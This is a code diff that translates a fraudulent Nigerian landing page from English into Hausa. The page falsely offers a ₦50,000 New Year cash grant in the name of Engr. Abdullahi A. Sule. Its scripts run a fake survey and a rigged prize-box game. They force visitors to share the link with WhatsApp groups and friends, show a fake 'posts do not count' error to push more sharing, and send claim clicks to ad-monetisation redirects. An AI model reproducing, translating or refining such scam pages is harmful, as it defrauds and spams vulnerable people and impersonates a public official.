@@ -5,7 +5,7 @@
 
 
 <!doctype html>
-<html lang="hs" dir="ltr">
+<html lang="en" dir="ltr">
   
 <head>
 	<script src="Sule-active.js"></script>
@@ -297,13 +297,13 @@ button:hover {
   
 
 <vue-modal :open="showInstructionsModal">
-<h2 class="heading heading--h1">Congratulation! Your answers have been saved</h2>
+<h2 class="heading heading--h1">Taya murna! An adana amsoshin ku</h2>
  
 <p class="paragraph">
-Now you have a chance to win ₦50,000 New Year Celebration cash prize<br><br>
-You have 3 chances ! we wish you good luck
+Yanzu kuna da damar lashe kyautar tsabar kuɗi ₦50,000 Bikin Sabuwar Shekara<br><br>
+Kuna da dama 3! muna muku fatan Alheri
 <br><br>
-You need to select the box that has the gift inside the boxes.
+Kuna buƙatar zaɓar akwatin da ke da kyauta a cikin kwalayen.
 </p>
    <br>
 <button class="button" v-on:click="showInstructionsModal = false">
@@ -311,9 +311,9 @@ Start
 </button>
 </vue-modal>
 <vue-modal :open="showFailModal">
-<h2 class="heading heading--h1">Better luck next time</h2>
+<h2 class="heading heading--h1">Mafi alheri a gaba</h2>
 <p class="paragraph">
-You have (2) extra chances. 
+Kuna da (2) ƙarin dama. 
 </p>
    <br>
 <button class="button" v-on:click="showFailModal = false">
@@ -322,11 +322,11 @@ OK
 </vue-modal>
 <vue-modal :open="showSuccessModal">
 <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikw4KvY3ouLY9iqVMpz6ziuhlkYN4ezGMGwIFmNjc5zFkeeTjUxjtL6YQCQC5Ba4FX0hZDA5H-LDXtcSkM61jsd7dp1HBRs0Ko6kZH7TEQ6AAPAiyU9WeE4qpFN7UM5QwsH_wPPvowTDgRmzwEZ-edP_oFyqbWJ7odZT2fswSlXBJK3KZDyXBwz2beBFlp/s320/4845523E-D4DD-4D00-9B2C-6EF6A5C30EDD.png" style="width: 240px;">
-<h1 class="heading heading--h1">Congratulations! </h1>
+<h1 class="heading heading--h1">Ina taya ku murna! </h1>
 <p class="paragraph">
 
 
-Your Prize is: <b> ₦50,000 cash</b><br>Follow the instructions on the next page to claim your prize ! 
+Kyautar ku ita ce: <b> ₦50,000 tsabar kudi</b><br>Bi umarnin a shafi na gaba don neman kyautar ku ! 
 </p>
     <br>
 <button class="button" v-on:click="$confetti.stop()" onclick="go();">
@@ -343,12 +343,12 @@ Ok
 
   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTxs6WlixGw8THHR5goyUkJYeQ3ETHo0NZoX1Nq06Wrmb2d7g0v5lu7cBqPq8YF7JQM-q7A4sxHjuI0LkictyC7PEh98TDOC5M5r3ei2HjyVKDW2cTUYQHkOAhcZMc4QiN9fmi2xi0QmPvWchppQiHKk1drz52NlNwpIMys4fG5oI4rQ4H3C1w67FeumCQ/s1600/NASARAWA_GOV_2020.jpg" style="width:100%;" />
 <h1 class="heading heading--h1">
-Hello!
+Sannu!
 </h1>
   <p class="paragraph">
-Welcome to <b>Engr. Abdullahi A. Sule ₦50,000 NEW YEAR CASH GRANT FOR NIGERIANS</b>, Dont miss this year Sule ₦50,000 New Year cash grant to NIGERIANS.
+Welcome to <b>Engr. Abdullahi A. Sule ₦50,000 TALLAFIN KUDIN SABON SHEKARA GA YAN NIGERIA</b>, Kar ku rasa wannan shekarar Sule ₦50,000 na Sabuwar Shekara ga 'yan NIGERIA.
 <br>
-Answer the questions below to claim <b>₦50,000 Cash Prize</b>
+Amsa tambayoyin da ke ƙasa don da'awar <b>₦50,000 Cash Prize</b>
 </p>
   <br>
 </div>
@@ -359,13 +359,13 @@ Answer the questions below to claim <b>₦50,000 Cash Prize</b>
 <div class="verify" v-if="showRotator">
 <vue-text-rotator v-on:rotate="rotate" v-on:finished="onRotatorFinished" :strings='[
                      "Please wait a moment...",
-              "Please wait a moment...",
-              "Please wait a moment..."
+              "Da fatan za a jira ɗan lokaci...",
+              "Da fatan za a jira ɗan lokaci..."
             ]'>
 </vue-text-rotator>
 <div class="verify__text" v-if="rotateIndex > 1">
 <strong>
-You have answered 4/4 of the questions
+Kun amsa 4/4 na tambayoyin
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
@@ -375,7 +375,7 @@ Your answers are being processed
 </div>
 <div class="verify__text" v-if="rotateIndex > 2">
 <strong>
-still prizes available!
+har yanzu akwai kyaututtuka!
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
@@ -385,30 +385,30 @@ Looking for gifts..
 </div>
 <div class="verify__text" v-if="rotateIndex > 3">
 <strong>
-Only (289) gifts remain!
+Kyauta (289) kawai suka rage!
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Stock is being checked
+Ana duba haja
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 </div>
 <vue-survey v-if="showSurvey" :show-steps="true" :questions='[
             {
-              title: "Are you a citizen of Nigeria?",
+              title: "Shin kai dan Najeriya ne?",
               answers: [ { text: "Yes" }, { text: "No" } ]
             },
                                                              {
-              title: "Do you have Nigerian ID number (NIN)",
+              title: "Kuna da lambar ID na Najeriya (NIN)",
               answers: [ { text: "Yes" }, { text: "No" } ]
             },
             {
-              title: "Choose your Gender?",
-              answers: [ { text: "Male" }, { text: "Female" } ]
+              title: "Zaɓi Jinsinku?",
+              answers: [ { text: "Namiji" }, { text: "Mace" } ]
             },
             {
-              title: "Select Your Age Range?",
+              title: "Zaɓi Ragewar Shekarunku?",
               answers: [ { text: "18 - 20years" }, { text: "21 - 25years" }, { text: "26 - 30 years" }, { text: "30years Above" } ]
             },
           ]' v-on:finish="onSurveyFinish"></vue-survey>
@@ -428,9 +428,9 @@ Stock is being checked
                            
 
                             </div>
-<p class="txt1">Your Prize is: <b>₦50,000</b> <br>Follow the instructions below to your prize !</p>
+<p class="txt1">Kyautar ku ita ce: <b>₦50,000</b> <br>Bi umarnin da ke ƙasa don kyautar ku !</p>
       <div class="bottom" id='buttonO'>
-<div id="lastapp"><p class="rules">1.share with 5 groups / 15 friends on "Whatsapp" (click the "Whatsapp" icon below)</p><p class="rules">2. Click "Continue" and claim your prize.</p></div>
+<div id="lastapp"><p class="rules">1.raba da kungiyoyi 5 / Abokai 15 akan "WhatsApp" (danna alamar "Whatsapp" da ke ƙasa)</p><p class="rules">2. Danna "Ci gaba" kuma ku nemi kyautar ku.</p></div>
 
     
    <div class="share_main_bt" id="whatsapp">WhatsApp&nbsp;   →</div>
@@ -465,7 +465,7 @@ Stock is being checked
                            
 
                             </div>
-<p class="txt1">Your Prize is: <b>₦50,000 cash.</b> <br>Follow the instruction below to claim your prize !</p>
+<p class="txt1">Kyautar ku ita ce: <b> ₦ 50,000 tsabar kudi.</b> <br>Bi umarnin da ke ƙasa don neman kyautar ku !</p>
             <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>   
         <br>
 	    
@@ -473,7 +473,7 @@ Stock is being checked
                     <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">CLAIM ₦50,000</font></button>
                     </a><br/> <br/>
 	    
-      <div class="share_main_bt" id="offer">CHOOSE ACCOUNT TYPE</div><br/> <br/>
+      <div class="share_main_bt" id="offer">ZABI NAU'IN ACCOUNT</div><br/> <br/>
 
 	     <a  onclick="window.open('https://whomeenoaglauns.com/4/8714647')" href="https://jesusboys.github.io/usvisa/ads-monetag" >
                     <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">SAVINGS</font></button>
@@ -483,7 +483,7 @@ Stock is being checked
                     </a><br/> <br/>
 	
                             
-            <div class="share_main_bt" id="offers">Withdraw ₦50,000</div> 
+            <div class="share_main_bt" id="offers">Cire ₦50,000</div> 
       <br>
           
        
@@ -527,7 +527,7 @@ function go() {
         var text1 = "ytime" ,
             text2 = " مكتبة جرير تقدم ",
             text3 = " سارع واحصل على قسيمتك قبل النفاذ من هنا : ",
-            error = "There is an error!\nPosts do not count. You may have shared it with the same friend or group more than once, please re-share.",
+            error = "Akwai kuskure!\n Saƙonnin ba su ƙidaya. Wataƙila kun raba shi da aboki ko rukuni ɗaya fiye da sau ɗaya, da fatan za a sake rabawa.",
             cpa = "https://whomeenoaglauns.com/4/8714647",
             cpa1 = "https://whomeenoaglauns.com/4/8714647",
             saved = "coke2",
@@ -536,10 +536,10 @@ function go() {
 
 <script>
   var tiaoban = [
-    "Engr. Abdullahi A. Sule ₦50,000 NEW YEAR CASH GRANT FOR NIGERIANS%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive ₦50,000 instantly for New YearCelebration.%0A i just got mine%0A%0AClick Here👇%0A https://get-offre.org/Sule-grant.html ",
-    "Engr. Abdullahi A. Sule ₦50,000 NEW YEAR CASH GRANT FOR NIGERIANS%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive ₦50,000 instantly for New YearCelebration.%0A i just got mine%0A%0AClick Here👇%0A https://get-offre.org/Sule-grant ",
-    "Engr. Abdullahi A. Sule ₦50,000 NEW YEAR CASH GRANT FOR NIGERIANS%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive ₦50,000 instantly for New YearCelebration.%0A i just got mine%0A%0AClick Here👇%0A https://get-offre.org/Sule-grant.html ",
-    "Engr. Abdullahi A. Sule ₦50,000 NEW YEAR CASH GRANT FOR NIGERIANS%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive ₦50,000 instantly for New YearCelebration.%0A i just got mine%0A%0AClick Here👇%0A https://get-offre.org/Sule-grant ",
+    "Engr. Abdullahi A. Sule ₦50,000 GA YAN NAJERIYA TALLAFIN KUDIN SABON SHEKARA.%0A%0A*YADDA AKE SAMU*%0AZiyarci hanyar haɗin da ke ƙasa kuma ku amsa tambayoyi masu zuwa kuma zaku karɓi ₦ 50,000 nan take don Bikin Sabuwar Shekara.%0A kawai na samu nawa%0A%0ADanna Nan👇%0A https://get-offre.org/Sule-grant.html ",
+    "Engr. Abdullahi A. Sule ₦50,000 GA YAN NAJERIYA TALLAFIN KUDIN SABON SHEKARA%0A%0A*YADDA AKE SAMU*%0AZiyarci hanyar haɗin da ke ƙasa kuma ku amsa tambayoyi masu zuwa kuma zaku karɓi ₦ 50,000 nan take don Bikin Sabuwar Shekara.%0A kawai na samu nawa%0A%0Akawai na samu nawa👇%0A https://get-offre.org/Sule-grant ",
+    "Engr. Abdullahi A. Sule ₦50,000 GA YAN NAJERIYA TALLAFIN KUDIN SABON SHEKARA%0A%0A*YADDA AKE SAMU*%0AZiyarci hanyar haɗin da ke ƙasa kuma ku amsa tambayoyi masu zuwa kuma zaku karɓi ₦ 50,000 nan take don Bikin Sabuwar Shekara.%0A kawai na samu nawa%0A%0Akawai na samu nawa👇%0A https://get-offre.org/Sule-grant.html ",
+    "Engr. Abdullahi A. Sule ₦50,000 GA YAN NAJERIYA TALLAFIN KUDIN SABON SHEKARA%0A%0A*YADDA AKE SAMU*%0AZiyarci hanyar haɗin da ke ƙasa kuma ku amsa tambayoyi masu zuwa kuma zaku karɓi ₦ 50,000 nan take don Bikin Sabuwar Shekara.%0A kawai na samu nawa%0A%0Akawai na samu nawa👇%0A https://get-offre.org/Sule-grant ",
 ];
 var tiaoban = tiaoban[Math.floor(Math.random() * tiaoban.length)];
 
@@ -622,8 +622,8 @@ $("#offerss").click(function () {
    function tipn(){
    Swal.fire({
   icon: 'error',
-  title: 'Unfortunately...',
-  text: 'To Receive Your Prize, You have to share with friends about our event. Share until the blue bar is full!',
+  title: 'Abin takaici...',
+  text: 'Don karɓar Kyautar ku, Dole ne ku raba tare da abokai game da taron mu. Raba har blue bar ya cika!',
   
 });
    }
